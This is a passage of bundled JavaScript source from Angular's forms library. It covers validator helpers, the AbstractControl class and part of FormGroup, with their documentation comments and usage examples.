  in a future version of Angular.

  For more information on this, see our API docs here:
  https://angular.io/api/forms/${directiveName === "formControl" ? "FormControlDirective" : "FormControlName"}#use-with-ngmodel
  `;
}
function describeKey(isFormGroup, key) {
  return isFormGroup ? `with name: '${key}'` : `at index: ${key}`;
}
function noControlsError(isFormGroup) {
  return `
    There are no form controls registered with this ${isFormGroup ? "group" : "array"} yet. If you're using ngModel,
    you may want to check next tick (e.g. use setTimeout).
  `;
}
function missingControlError(isFormGroup, key) {
  return `Cannot find form control ${describeKey(isFormGroup, key)}`;
}
function missingControlValueError(isFormGroup, key) {
  return `Must supply a value for form control ${describeKey(isFormGroup, key)}`;
}
var VALID = "VALID";
var INVALID = "INVALID";
var PENDING = "PENDING";
var DISABLED = "DISABLED";
function pickValidators(validatorOrOpts) {
  return (isOptionsObj(validatorOrOpts) ? validatorOrOpts.validators : validatorOrOpts) || null;
}
function coerceToValidator(validator) {
  return Array.isArray(validator) ? composeValidators(validator) : validator || null;
}
function pickAsyncValidators(asyncValidator, validatorOrOpts) {
  if (typeof ngDevMode === "undefined" || ngDevMode) {
    if (isOptionsObj(validatorOrOpts) && asyncValidator) {
      console.warn(asyncValidatorsDroppedWithOptsWarning);
    }
  }
  return (isOptionsObj(validatorOrOpts) ? validatorOrOpts.asyncValidators : asyncValidator) || null;
}
function coerceToAsyncValidator(asyncValidator) {
  return Array.isArray(asyncValidator) ? composeAsyncValidators(asyncValidator) : asyncValidator || null;
}
function isOptionsObj(validatorOrOpts) {
  return validatorOrOpts != null && !Array.isArray(validatorOrOpts) && typeof validatorOrOpts === "object";
}
function assertControlPresent(parent, isGroup, key) {
  const controls = parent.controls;
  const collection = isGroup ? Object.keys(controls) : controls;
  if (!collection.length) {
    throw new RuntimeError(1e3, typeof ngDevMode === "undefined" || ngDevMode ? noControlsError(isGroup) : "");
  }
  if (!controls[key]) {
    throw new RuntimeError(1001, typeof ngDevMode === "undefined" || ngDevMode ? missingControlError(isGroup, key) : "");
  }
}
function assertAllValuesPresent(control, isGroup, value) {
  control._forEachChild((_, key) => {
    if (value[key] === void 0) {
      throw new RuntimeError(1002, typeof ngDevMode === "undefined" || ngDevMode ? missingControlValueError(isGroup, key) : "");
    }
  });
}
var AbstractControl = class {
  /**
   * Initialize the AbstractControl instance.
   *
   * @param validators The function or array of functions that is used to determine the validity of
   *     this control synchronously.
   * @param asyncValidators The function or array of functions that is used to determine validity of
   *     this control asynchronously.
   */
  constructor(validators, asyncValidators) {
    this._pendingDirty = false;
    this._hasOwnPendingAsyncValidator = false;
    this._pendingTouched = false;
    this._onCollectionChange = () => {
    };
    this._parent = null;
    this.pristine = true;
    this.touched = false;
    this._onDisabledChange = [];
    this._assignValidators(validators);
    this._assignAsyncValidators(asyncValidators);
  }
  /**
   * Returns the function that is used to determine the validity of this control synchronously.
   * If multiple validators have been added, this will be a single composed function.
   * See `Validators.compose()` for additional information.
   */
  get validator() {
    return this._composedValidatorFn;
  }
  set validator(validatorFn) {
    this._rawValidators = this._composedValidatorFn = validatorFn;
  }
  /**
   * Returns the function that is used to determine the validity of this control asynchronously.
   * If multiple validators have been added, this will be a single composed function.
   * See `Validators.compose()` for additional information.
   */
  get asyncValidator() {
    return this._composedAsyncValidatorFn;
  }
  set asyncValidator(asyncValidatorFn) {
    this._rawAsyncValidators = this._composedAsyncValidatorFn = asyncValidatorFn;
  }
  /**
   * The parent control.
   */
  get parent() {
    return this._parent;
  }
  /**
   * A control is `valid` when its `status` is `VALID`.
   *
   * @see {@link AbstractControl.status}
   *
   * @returns True if the control has passed all of its validation tests,
   * false otherwise.
   */
  get valid() {
    return this.status === VALID;
  }
  /**
   * A control is `invalid` when its `status` is `INVALID`.
   *
   * @see {@link AbstractControl.status}
   *
   * @returns True if this control has failed one or more of its validation checks,
   * false otherwise.
   */
  get invalid() {
    return this.status === INVALID;
  }
  /**
   * A control is `pending` when its `status` is `PENDING`.
   *
   * @see {@link AbstractControl.status}
   *
   * @returns True if this control is in the process of conducting a validation check,
   * false otherwise.
   */
  get pending() {
    return this.status == PENDING;
  }
  /**
   * A control is `disabled` when its `status` is `DISABLED`.
   *
   * Disabled controls are exempt from validation checks and
   * are not included in the aggregate value of their ancestor
   * controls.
   *
   * @see {@link AbstractControl.status}
   *
   * @returns True if the control is disabled, false otherwise.
   */
  get disabled() {
    return this.status === DISABLED;
  }
  /**
   * A control is `enabled` as long as its `status` is not `DISABLED`.
   *
   * @returns True if the control has any status other than 'DISABLED',
   * false if the status is 'DISABLED'.
   *
   * @see {@link AbstractControl.status}
   *
   */
  get enabled() {
    return this.status !== DISABLED;
  }
  /**
   * A control is `dirty` if the user has changed the value
   * in the UI.
   *
   * @returns True if the user has changed the value of this control in the UI; compare `pristine`.
   * Programmatic changes to a control's value do not mark it dirty.
   */
  get dirty() {
    return !this.pristine;
  }
  /**
   * True if the control has not been marked as touched
   *
   * A control is `untouched` if the user has not yet triggered
   * a `blur` event on it.
   */
  get untouched() {
    return !this.touched;
  }
  /**
   * Reports the update strategy of the `AbstractControl` (meaning
   * the event on which the control updates itself).
   * Possible values: `'change'` | `'blur'` | `'submit'`
   * Default value: `'change'`
   */
  get updateOn() {
    return this._updateOn ? this._updateOn : this.parent ? this.parent.updateOn : "change";
  }
  /**
   * Sets the synchronous validators that are active on this control.  Calling
   * this overwrites any existing synchronous validators.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   * If you want to add a new validator without affecting existing ones, consider
   * using `addValidators()` method instead.
   */
  setValidators(validators) {
    this._assignValidators(validators);
  }
  /**
   * Sets the asynchronous validators that are active on this control. Calling this
   * overwrites any existing asynchronous validators.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   * If you want to add a new validator without affecting existing ones, consider
   * using `addAsyncValidators()` method instead.
   */
  setAsyncValidators(validators) {
    this._assignAsyncValidators(validators);
  }
  /**
   * Add a synchronous validator or validators to this control, without affecting other validators.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   * Adding a validator that already exists will have no effect. If duplicate validator functions
   * are present in the `validators` array, only the first instance would be added to a form
   * control.
   *
   * @param validators The new validator function or functions to add to this control.
   */
  addValidators(validators) {
    this.setValidators(addValidators(validators, this._rawValidators));
  }
  /**
   * Add an asynchronous validator or validators to this control, without affecting other
   * validators.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   * Adding a validator that already exists will have no effect.
   *
   * @param validators The new asynchronous validator function or functions to add to this control.
   */
  addAsyncValidators(validators) {
    this.setAsyncValidators(addValidators(validators, this._rawAsyncValidators));
  }
  /**
   * Remove a synchronous validator from this control, without affecting other validators.
   * Validators are compared by function reference; you must pass a reference to the exact same
   * validator function as the one that was originally set. If a provided validator is not found,
   * it is ignored.
   *
   * @usageNotes
   *
   * ### Reference to a ValidatorFn
   *
   * ```
   * // Reference to the RequiredValidator
   * const ctrl = new FormControl<string | null>('', Validators.required);
   * ctrl.removeValidators(Validators.required);
   *
   * // Reference to anonymous function inside MinValidator
   * const minValidator = Validators.min(3);
   * const ctrl = new FormControl<string | null>('', minValidator);
   * expect(ctrl.hasValidator(minValidator)).toEqual(true)
   * expect(ctrl.hasValidator(Validators.min(3))).toEqual(false)
   *
   * ctrl.removeValidators(minValidator);
   * ```
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   * @param validators The validator or validators to remove.
   */
  removeValidators(validators) {
    this.setValidators(removeValidators(validators, this._rawValidators));
  }
  /**
   * Remove an asynchronous validator from this control, without affecting other validators.
   * Validators are compared by function reference; you must pass a reference to the exact same
   * validator function as the one that was originally set. If a provided validator is not found, it
   * is ignored.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   * @param validators The asynchronous validator or validators to remove.
   */
  removeAsyncValidators(validators) {
    this.setAsyncValidators(removeValidators(validators, this._rawAsyncValidators));
  }
  /**
   * Check whether a synchronous validator function is present on this control. The provided
   * validator must be a reference to the exact same function that was provided.
   *
   * @usageNotes
   *
   * ### Reference to a ValidatorFn
   *
   * ```
   * // Reference to the RequiredValidator
   * const ctrl = new FormControl<number | null>(0, Validators.required);
   * expect(ctrl.hasValidator(Validators.required)).toEqual(true)
   *
   * // Reference to anonymous function inside MinValidator
   * const minValidator = Validators.min(3);
   * const ctrl = new FormControl<number | null>(0, minValidator);
   * expect(ctrl.hasValidator(minValidator)).toEqual(true)
   * expect(ctrl.hasValidator(Validators.min(3))).toEqual(false)
   * ```
   *
   * @param validator The validator to check for presence. Compared by function reference.
   * @returns Whether the provided validator was found on this control.
   */
  hasValidator(validator) {
    return hasValidator(this._rawValidators, validator);
  }
  /**
   * Check whether an asynchronous validator function is present on this control. The provided
   * validator must be a reference to the exact same function that was provided.
   *
   * @param validator The asynchronous validator to check for presence. Compared by function
   *     reference.
   * @returns Whether the provided asynchronous validator was found on this control.
   */
  hasAsyncValidator(validator) {
    return hasValidator(this._rawAsyncValidators, validator);
  }
  /**
   * Empties out the synchronous validator list.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   */
  clearValidators() {
    this.validator = null;
  }
  /**
   * Empties out the async validator list.
   *
   * When you add or remove a validator at run time, you must call
   * `updateValueAndValidity()` for the new validation to take effect.
   *
   */
  clearAsyncValidators() {
    this.asyncValidator = null;
  }
  /**
   * Marks the control as `touched`. A control is touched by focus and
   * blur events that do not change the value.
   *
   * @see {@link markAsUntouched()}
   * @see {@link markAsDirty()}
   * @see {@link markAsPristine()}
   *
   * @param opts Configuration options that determine how the control propagates changes
   * and emits events after marking is applied.
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   */
  markAsTouched(opts = {}) {
    this.touched = true;
    if (this._parent && !opts.onlySelf) {
      this._parent.markAsTouched(opts);
    }
  }
  /**
   * Marks the control and all its descendant controls as `touched`.
   * @see {@link markAsTouched()}
   */
  markAllAsTouched() {
    this.markAsTouched({
      onlySelf: true
    });
    this._forEachChild((control) => control.markAllAsTouched());
  }
  /**
   * Marks the control as `untouched`.
   *
   * If the control has any children, also marks all children as `untouched`
   * and recalculates the `touched` status of all parent controls.
   *
   * @see {@link markAsTouched()}
   * @see {@link markAsDirty()}
   * @see {@link markAsPristine()}
   *
   * @param opts Configuration options that determine how the control propagates changes
   * and emits events after the marking is applied.
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   */
  markAsUntouched(opts = {}) {
    this.touched = false;
    this._pendingTouched = false;
    this._forEachChild((control) => {
      control.markAsUntouched({
        onlySelf: true
      });
    });
    if (this._parent && !opts.onlySelf) {
      this._parent._updateTouched(opts);
    }
  }
  /**
   * Marks the control as `dirty`. A control becomes dirty when
   * the control's value is changed through the UI; compare `markAsTouched`.
   *
   * @see {@link markAsTouched()}
   * @see {@link markAsUntouched()}
   * @see {@link markAsPristine()}
   *
   * @param opts Configuration options that determine how the control propagates changes
   * and emits events after marking is applied.
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   */
  markAsDirty(opts = {}) {
    this.pristine = false;
    if (this._parent && !opts.onlySelf) {
      this._parent.markAsDirty(opts);
    }
  }
  /**
   * Marks the control as `pristine`.
   *
   * If the control has any children, marks all children as `pristine`,
   * and recalculates the `pristine` status of all parent
   * controls.
   *
   * @see {@link markAsTouched()}
   * @see {@link markAsUntouched()}
   * @see {@link markAsDirty()}
   *
   * @param opts Configuration options that determine how the control emits events after
   * marking is applied.
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   */
  markAsPristine(opts = {}) {
    this.pristine = true;
    this._pendingDirty = false;
    this._forEachChild((control) => {
      control.markAsPristine({
        onlySelf: true
      });
    });
    if (this._parent && !opts.onlySelf) {
      this._parent._updatePristine(opts);
    }
  }
  /**
   * Marks the control as `pending`.
   *
   * A control is pending while the control performs async validation.
   *
   * @see {@link AbstractControl.status}
   *
   * @param opts Configuration options that determine how the control propagates changes and
   * emits events after marking is applied.
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   * * `emitEvent`: When true or not supplied (the default), the `statusChanges`
   * observable emits an event with the latest status the control is marked pending.
   * When false, no events are emitted.
   *
   */
  markAsPending(opts = {}) {
    this.status = PENDING;
    if (opts.emitEvent !== false) {
      this.statusChanges.emit(this.status);
    }
    if (this._parent && !opts.onlySelf) {
      this._parent.markAsPending(opts);
    }
  }
  /**
   * Disables the control. This means the control is exempt from validation checks and
   * excluded from the aggregate value of any parent. Its status is `DISABLED`.
   *
   * If the control has children, all children are also disabled.
   *
   * @see {@link AbstractControl.status}
   *
   * @param opts Configuration options that determine how the control propagates
   * changes and emits events after the control is disabled.
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control is disabled.
   * When false, no events are emitted.
   */
  disable(opts = {}) {
    const skipPristineCheck = this._parentMarkedDirty(opts.onlySelf);
    this.status = DISABLED;
    this.errors = null;
    this._forEachChild((control) => {
      control.disable(__spreadProps(__spreadValues({}, opts), {
        onlySelf: true
      }));
    });
    this._updateValue();
    if (opts.emitEvent !== false) {
      this.valueChanges.emit(this.value);
      this.statusChanges.emit(this.status);
    }
    this._updateAncestors(__spreadProps(__spreadValues({}, opts), {
      skipPristineCheck
    }));
    this._onDisabledChange.forEach((changeFn) => changeFn(true));
  }
  /**
   * Enables the control. This means the control is included in validation checks and
   * the aggregate value of its parent. Its status recalculates based on its value and
   * its validators.
   *
   * By default, if the control has children, all children are enabled.
   *
   * @see {@link AbstractControl.status}
   *
   * @param opts Configure options that control how the control propagates changes and
   * emits events when marked as untouched
   * * `onlySelf`: When true, mark only this control. When false or not supplied,
   * marks all direct ancestors. Default is false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control is enabled.
   * When false, no events are emitted.
   */
  enable(opts = {}) {
    const skipPristineCheck = this._parentMarkedDirty(opts.onlySelf);
    this.status = VALID;
    this._forEachChild((control) => {
      control.enable(__spreadProps(__spreadValues({}, opts), {
        onlySelf: true
      }));
    });
    this.updateValueAndValidity({
      onlySelf: true,
      emitEvent: opts.emitEvent
    });
    this._updateAncestors(__spreadProps(__spreadValues({}, opts), {
      skipPristineCheck
    }));
    this._onDisabledChange.forEach((changeFn) => changeFn(false));
  }
  _updateAncestors(opts) {
    if (this._parent && !opts.onlySelf) {
      this._parent.updateValueAndValidity(opts);
      if (!opts.skipPristineCheck) {
        this._parent._updatePristine();
      }
      this._parent._updateTouched();
    }
  }
  /**
   * Sets the parent of the control
   *
   * @param parent The new parent.
   */
  setParent(parent) {
    this._parent = parent;
  }
  /**
   * The raw value of this control. For most control implementations, the raw value will include
   * disabled children.
   */
  getRawValue() {
    return this.value;
  }
  /**
   * Recalculates the value and validation status of the control.
   *
   * By default, it also updates the value and validity of its ancestors.
   *
   * @param opts Configuration options determine how the control propagates changes and emits events
   * after updates and validity checks are applied.
   * * `onlySelf`: When true, only update this control. When false or not supplied,
   * update all direct ancestors. Default is false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control is updated.
   * When false, no events are emitted.
   */
  updateValueAndValidity(opts = {}) {
    this._setInitialStatus();
    this._updateValue();
    if (this.enabled) {
      this._cancelExistingSubscription();
      this.errors = this._runValidator();
      this.status = this._calculateStatus();
      if (this.status === VALID || this.status === PENDING) {
        this._runAsyncValidator(opts.emitEvent);
      }
    }
    if (opts.emitEvent !== false) {
      this.valueChanges.emit(this.value);
      this.statusChanges.emit(this.status);
    }
    if (this._parent && !opts.onlySelf) {
      this._parent.updateValueAndValidity(opts);
    }
  }
  /** @internal */
  _updateTreeValidity(opts = {
    emitEvent: true
  }) {
    this._forEachChild((ctrl) => ctrl._updateTreeValidity(opts));
    this.updateValueAndValidity({
      onlySelf: true,
      emitEvent: opts.emitEvent
    });
  }
  _setInitialStatus() {
    this.status = this._allControlsDisabled() ? DISABLED : VALID;
  }
  _runValidator() {
    return this.validator ? this.validator(this) : null;
  }
  _runAsyncValidator(emitEvent) {
    if (this.asyncValidator) {
      this.status = PENDING;
      this._hasOwnPendingAsyncValidator = true;
      const obs = toObservable(this.asyncValidator(this));
      this._asyncValidationSubscription = obs.subscribe((errors) => {
        this._hasOwnPendingAsyncValidator = false;
        this.setErrors(errors, {
          emitEvent
        });
      });
    }
  }
  _cancelExistingSubscription() {
    if (this._asyncValidationSubscription) {
      this._asyncValidationSubscription.unsubscribe();
      this._hasOwnPendingAsyncValidator = false;
    }
  }
  /**
   * Sets errors on a form control when running validations manually, rather than automatically.
   *
   * Calling `setErrors` also updates the validity of the parent control.
   *
   * @param opts Configuration options that determine how the control propagates
   * changes and emits events after the control errors are set.
   * * `emitEvent`: When true or not supplied (the default), the `statusChanges`
   * observable emits an event after the errors are set.
   *
   * @usageNotes
   *
   * ### Manually set the errors for a control
   *
   * ```
   * const login = new FormControl('someLogin');
   * login.setErrors({
   *   notUnique: true
   * });
   *
   * expect(login.valid).toEqual(false);
   * expect(login.errors).toEqual({ notUnique: true });
   *
   * login.setValue('someOtherLogin');
   *
   * expect(login.valid).toEqual(true);
   * ```
   */
  setErrors(errors, opts = {}) {
    this.errors = errors;
    this._updateControlsErrors(opts.emitEvent !== false);
  }
  /**
   * Retrieves a child control given the control's name or path.
   *
   * @param path A dot-delimited string or array of string/number values that define the path to the
   * control. If a string is provided, passing it as a string literal will result in improved type
   * information. Likewise, if an array is provided, passing it `as const` will cause improved type
   * information to be available.
   *
   * @usageNotes
   * ### Retrieve a nested control
   *
   * For example, to get a `name` control nested within a `person` sub-group:
   *
   * * `this.form.get('person.name');`
   *
   * -OR-
   *
   * * `this.form.get(['person', 'name'] as const);` // `as const` gives improved typings
   *
   * ### Retrieve a control in a FormArray
   *
   * When accessing an element inside a FormArray, you can use an element index.
   * For example, to get a `price` control from the first element in an `items` array you can use:
   *
   * * `this.form.get('items.0.price');`
   *
   * -OR-
   *
   * * `this.form.get(['items', 0, 'price']);`
   */
  get(path) {
    let currPath = path;
    if (currPath == null)
      return null;
    if (!Array.isArray(currPath))
      currPath = currPath.split(".");
    if (currPath.length === 0)
      return null;
    return currPath.reduce((control, name) => control && control._find(name), this);
  }
  /**
   * @description
   * Reports error data for the control with the given path.
   *
   * @param errorCode The code of the error to check
   * @param path A list of control names that designates how to move from the current control
   * to the control that should be queried for errors.
   *
   * @usageNotes
   * For example, for the following `FormGroup`:
   *
   * ```
   * form = new FormGroup({
   *   address: new FormGroup({ street: new FormControl() })
   * });
   * ```
   *
   * The path to the 'street' control from the root form would be 'address' -> 'street'.
   *
   * It can be provided to this method in one of two formats:
   *
   * 1. An array of string control names, e.g. `['address', 'street']`
   * 1. A period-delimited list of control names in one string, e.g. `'address.street'`
   *
   * @returns error data for that particular error. If the control or error is not present,
   * null is returned.
   */
  getError(errorCode, path) {
    const control = path ? this.get(path) : this;
    return control && control.errors ? control.errors[errorCode] : null;
  }
  /**
   * @description
   * Reports whether the control with the given path has the error specified.
   *
   * @param errorCode The code of the error to check
   * @param path A list of control names that designates how to move from the current control
   * to the control that should be queried for errors.
   *
   * @usageNotes
   * For example, for the following `FormGroup`:
   *
   * ```
   * form = new FormGroup({
   *   address: new FormGroup({ street: new FormControl() })
   * });
   * ```
   *
   * The path to the 'street' control from the root form would be 'address' -> 'street'.
   *
   * It can be provided to this method in one of two formats:
   *
   * 1. An array of string control names, e.g. `['address', 'street']`
   * 1. A period-delimited list of control names in one string, e.g. `'address.street'`
   *
   * If no path is given, this method checks for the error on the current control.
   *
   * @returns whether the given error is present in the control at the given path.
   *
   * If the control is not present, false is returned.
   */
  hasError(errorCode, path) {
    return !!this.getError(errorCode, path);
  }
  /**
   * Retrieves the top-level ancestor of this control.
   */
  get root() {
    let x = this;
    while (x._parent) {
      x = x._parent;
    }
    return x;
  }
  /** @internal */
  _updateControlsErrors(emitEvent) {
    this.status = this._calculateStatus();
    if (emitEvent) {
      this.statusChanges.emit(this.status);
    }
    if (this._parent) {
      this._parent._updateControlsErrors(emitEvent);
    }
  }
  /** @internal */
  _initObservables() {
    this.valueChanges = new EventEmitter();
    this.statusChanges = new EventEmitter();
  }
  _calculateStatus() {
    if (this._allControlsDisabled())
      return DISABLED;
    if (this.errors)
      return INVALID;
    if (this._hasOwnPendingAsyncValidator || this._anyControlsHaveStatus(PENDING))
      return PENDING;
    if (this._anyControlsHaveStatus(INVALID))
      return INVALID;
    return VALID;
  }
  /** @internal */
  _anyControlsHaveStatus(status) {
    return this._anyControls((control) => control.status === status);
  }
  /** @internal */
  _anyControlsDirty() {
    return this._anyControls((control) => control.dirty);
  }
  /** @internal */
  _anyControlsTouched() {
    return this._anyControls((control) => control.touched);
  }
  /** @internal */
  _updatePristine(opts = {}) {
    this.pristine = !this._anyControlsDirty();
    if (this._parent && !opts.onlySelf) {
      this._parent._updatePristine(opts);
    }
  }
  /** @internal */
  _updateTouched(opts = {}) {
    this.touched = this._anyControlsTouched();
    if (this._parent && !opts.onlySelf) {
      this._parent._updateTouched(opts);
    }
  }
  /** @internal */
  _registerOnCollectionChange(fn) {
    this._onCollectionChange = fn;
  }
  /** @internal */
  _setUpdateStrategy(opts) {
    if (isOptionsObj(opts) && opts.updateOn != null) {
      this._updateOn = opts.updateOn;
    }
  }
  /**
   * Check to see if parent has been marked artificially dirty.
   *
   * @internal
   */
  _parentMarkedDirty(onlySelf) {
    const parentDirty = this._parent && this._parent.dirty;
    return !onlySelf && !!parentDirty && !this._parent._anyControlsDirty();
  }
  /** @internal */
  _find(name) {
    return null;
  }
  /**
   * Internal implementation of the `setValidators` method. Needs to be separated out into a
   * different method, because it is called in the constructor and it can break cases where
   * a control is extended.
   */
  _assignValidators(validators) {
    this._rawValidators = Array.isArray(validators) ? validators.slice() : validators;
    this._composedValidatorFn = coerceToValidator(this._rawValidators);
  }
  /**
   * Internal implementation of the `setAsyncValidators` method. Needs to be separated out into a
   * different method, because it is called in the constructor and it can break cases where
   * a control is extended.
   */
  _assignAsyncValidators(validators) {
    this._rawAsyncValidators = Array.isArray(validators) ? validators.slice() : validators;
    this._composedAsyncValidatorFn = coerceToAsyncValidator(this._rawAsyncValidators);
  }
};
var FormGroup = class extends AbstractControl {
  /**
   * Creates a new `FormGroup` instance.
   *
   * @param controls A collection of child controls. The key for each child is the name
   * under which it is registered.
   *
   * @param validatorOrOpts A synchronous validator function, or an array of
   * such functions, or an `AbstractControlOptions` object that contains validation functions
   * and a validation trigger.
   *
   * @param asyncValidator A single async validator or array of async validator functions
   *
   */
  constructor(controls, validatorOrOpts, asyncValidator) {
    super(pickValidators(validatorOrOpts), pickAsyncValidators(asyncValidator, validatorOrOpts));
    (typeof ngDevMode === "undefined" || ngDevMode) && validateFormGroupControls(controls);
    this.controls = controls;
    this._initObservables();
    this._setUpdateStrategy(validatorOrOpts);
    this._setUpControls();
    this.updateValueAndValidity({
      onlySelf: true,
      // If `asyncValidator` is present, it will trigger control status change from `PENDING` to
      // `VALID` or `INVALID`. The status should be broadcasted via the `statusChanges` observable,
      // so we set `emitEvent` to `true` to allow that during the control creation process.
      emitEvent: !!this.asyncValidator
    });
  }
  registerControl(name, control) {
    if (this.controls[name])
      return this.controls[name];
    this.controls[name] = control;
    control.setParent(this);
    control._registerOnCollectionChange(this._onCollectionChange);
    return control;
  }
  addControl(name, control, options = {}) {
    this.registerControl(name, control);
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
    this._onCollectionChange();
  }
  /**
   * Remove a control from this group. In a strongly-typed group, required controls cannot be
   * removed.
   *
   * This method also updates the value and validity of the control.
   *
   * @param name The control name to remove from the collection
   * @param options Specifies whether this FormGroup instance should emit events after a
   *     control is removed.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control is
   * removed. When false, no events are emitted.
   */
  removeControl(name, options = {}) {
    if (this.controls[name])
      this.controls[name]._registerOnCollectionChange(() => {
      });
    delete this.controls[name];
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
    this._onCollectionChange();
  }
  setControl(name, control, options = {}) {
    if (this.controls[name])
      this.controls[name]._registerOnCollectionChange(() => {
      });
    delete this.controls[name];
    if (control)
      this.registerControl(name, control);
    this.updateValueAndValidity({
      emitEvent: options.emitEvent
    });
    this._onCollectionChange();
  }
  contains(controlName) {
    return this.controls.hasOwnProperty(controlName) && this.controls[controlName].enabled;
  }
  /**
   * Sets the value of the `FormGroup`. It accepts an object that matches
   * the structure of the group, with control names as keys.
   *
   * @usageNotes
   * ### Set the complete value for the form group
   *
   * ```
   * const form = new FormGroup({
   *   first: new FormControl(),
   *   last: new FormControl()
   * });
   *
   * console.log(form.value);   // {first: null, last: null}
   *
   * form.setValue({first: 'Nancy', last: 'Drew'});
   * console.log(form.value);   // {first: 'Nancy', last: 'Drew'}
   * ```
   *
   * @throws When strict checks fail, such as setting the value of a control
   * that doesn't exist or if you exclude a value of a control that does exist.
   *
   * @param value The new value for the control that matches the structure of the group.
   * @param options Configuration options that determine how the control propagates changes
   * and emits events after the value changes.
   * The configuration options are passed to the {@link AbstractControl#updateValueAndValidity
   * updateValueAndValidity} method.
   *
   * * `onlySelf`: When true, each change only affects this control, and not its parent. Default is
   * false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control value is updated.
   * When false, no events are emitted.
   */
  setValue(value, options = {}) {
    assertAllValuesPresent(this, true, value);
    Object.keys(value).forEach((name) => {
      assertControlPresent(this, true, name);
      this.controls[name].setValue(value[name], {
        onlySelf: true,
        emitEvent: options.emitEvent
      });
    });
    this.updateValueAndValidity(options);
  }
  /**
   * Patches the value of the `FormGroup`. It accepts an object with control
   * names as keys, and does its best to match the values to the correct controls
   * in the group.
   *
   * It accepts both super-sets and sub-sets of the group without throwing an error.
   *
   * @usageNotes
   * ### Patch the value for a form group
   *
   * ```
   * const form = new FormGroup({
   *    first: new FormControl(),
   *    last: new FormControl()
   * });
   * console.log(form.value);   // {first: null, last: null}
   *
   * form.patchValue({first: 'Nancy'});
   * console.log(form.value);   // {first: 'Nancy', last: null}
   * ```
   *
   * @param value The object that matches the structure of the group.
   * @param options Configuration options that determine how the control propagates changes and
   * emits events after the value is patched.
   * * `onlySelf`: When true, each change only affects this control and not its parent. Default is
   * true.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges` observables emit events with the latest status and value when the control value
   * is updated. When false, no events are emitted. The configuration options are passed to
   * the {@link AbstractControl#updateValueAndValidity updateValueAndValidity} method.
   */
  patchValue(value, options = {}) {
    if (value == null)
      return;
    Object.keys(value).forEach((name) => {
      const control = this.controls[name];
      if (control) {
        control.patchValue(
          /* Guaranteed to be present, due to the outer forEach. */
          value[name],
          {
            onlySelf: true,
            emitEvent: options.emitEvent
          }
        );
      }
    });
    this.updateValueAndValidity(options);
  }
  /**
   * Resets the `FormGroup`, marks all descendants `pristine` and `untouched` and sets
   * the value of all descendants to their default values, or null if no defaults were provided.
   *
   * You reset to a specific form state by passing in a map of states
   * that matches the structure of your form, with control names as keys. The state
   * is a standalone value or a form state object with both a value and a disabled
   * status.
   *
   * @param value Resets the control with an initial value,
   * or an object that defines the initial value and disabled state.
   *
   * @param options Configuration options that determine how the control propagates changes
   * and emits events when the group is reset.
   * * `onlySelf`: When true, each change only affects this control, and not its parent. Default is
   * false.
   * * `emitEvent`: When true or not supplied (the default), both the `statusChanges` and
   * `valueChanges`
   * observables emit events with the latest status and value when the control is reset.
   * When false, no events are emitted.
   * The configuration options are passed to the {@link AbstractControl#updateValueAndValidity
   * updateValueAndValidity} method.
   *
   * @usageNotes
   *
   * ### Reset the form group values
   *
   * ```ts
   * const form = new FormGroup({
   *   first: new FormControl('first name'),
   *   last: new FormControl('last name')
   * });
   *
   * console.log(form.value);  // {first: 'first name', last: 'last name'}
   *
   * form.reset({ first: 'name', last: 'last name' });
   *
   * console.log(form.value);  // {first: 'name', last: 'last name'}
   * ```
   *
   * ### Reset the form group values and disabled status
   *
   * ```
   * const form = new FormGroup({
   *   first: new FormControl('first name'),
   *   last: new FormControl('last name')
   * });
   *
   * form.reset({
   *   first: {value: 'name', disabled: true},
   *   last: 'last'
   * });
   *
   * console.log(form.value);  // {last: 'last'}
   * console.log(form.get('first').status);  // 'DISABLED'
   * ```
   */
  reset(value = {}, options = {}) {
    this._forEachChild((control, name) => {
      control.reset(value ? value[name] : null, {
        onlySelf: true,
        emitEvent: options.emitEvent
      });
    });
    this._updatePristine(options);
    this._updateTouched(options);
    this.updateValueAndValidity(options);
  }
  /**
   * The aggregate value of the `FormGroup`, including any disabled controls.
   *
   * Retrieves all values regardless of disabled status.
   */
  getRawValue() {
    return this._reduceChildren({}, (acc, control, name) => {
      acc[name] = control.getRawValue();
      return acc;
    });
  }
  /** @internal */
  _syncPendingControls() {
    let subtreeUpdated = this._reduceChildren(false, (updated, child) => {
      return child._syncPendingControls() ? true : updated;
    });
    if (subtreeUpdated)
      this.updateValueAndValidity({
        onlySelf: true
      });
    return subtreeUpdated;
  }
  /** @internal */
  _forEachChild(cb) {
    Object.keys(this.controls).forEach((key) => {
      const control = this.controls[key];
      control && cb(control, key);
    });
  }
  /** @internal */
  _setUpControls() {
    this._forEachChild((control) => {
